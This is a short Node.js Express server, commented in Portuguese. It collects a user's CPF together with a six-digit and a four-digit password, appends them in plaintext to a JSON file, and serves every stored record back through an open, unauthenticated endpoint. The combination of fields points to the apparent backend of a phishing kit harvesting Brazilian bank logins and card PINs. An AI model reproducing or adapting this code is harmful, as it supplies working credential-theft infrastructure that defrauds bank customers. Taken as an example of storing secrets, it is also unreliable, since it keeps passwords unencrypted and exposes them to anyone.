const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3001;

app.use(cors());
app.use(express.json());

// Servir arquivos estáticos
app.use(express.static('public'));

// Rota para salvar dados
app.post('/api/salvar-dados', (req, res) => {
    const { cpf, senha6, senha4 } = req.body;

    if (!cpf || !senha6 || !senha4) {
        return res.status(400).json({ error: 'Dados incompletos' });
    }

    // Definir fuso horário de São Paulo
    const dataHora = new Date().toLocaleString('pt-BR', {
        timeZone: 'America/Sao_Paulo',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    // Preparar dados para salvar
    const dadosParaSalvar = {
        cpf: cpf,
        senha6: senha6,
        senha4: senha4,
        data_hora: dataHora,
        timestamp: Math.floor(Date.now() / 1000)
    };

    // Nome do arquivo JSON
    const arquivo = path.join(__dirname, 'dados.json');

    // Ler dados existentes
    let dadosExistentes = [];
    if (fs.existsSync(arquivo)) {
        try {
            const conteudo = fs.readFileSync(arquivo, 'utf8');
            dadosExistentes = JSON.parse(conteudo);
            if (!Array.isArray(dadosExistentes)) {
                dadosExistentes = [];
            }
        } catch (error) {
            console.error('Erro ao ler arquivo:', error);
            dadosExistentes = [];
        }
    }

    // Adicionar novo registro
    dadosExistentes.push(dadosParaSalvar);

    // Salvar no arquivo JSON
    try {
        fs.writeFileSync(arquivo, JSON.stringify(dadosExistentes, null, 4), 'utf8');
        res.json({ success: true, message: 'Dados salvos com sucesso' });
    } catch (error) {
        console.error('Erro ao salvar arquivo:', error);
        res.status(500).json({ error: 'Erro ao salvar dados' });
    }
});

// Rota para obter dados
app.get('/api/dados', (req, res) => {
    const arquivo = path.join(__dirname, 'dados.json');
    
    if (!fs.existsSync(arquivo)) {
        return res.json([]);
    }

    try {
        const conteudo = fs.readFileSync(arquivo, 'utf8');
        const dados = JSON.parse(conteudo);
        res.json(Array.isArray(dados) ? dados : []);
    } catch (error) {
        console.error('Erro ao ler arquivo:', error);
        res.json([]);
    }
});

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});

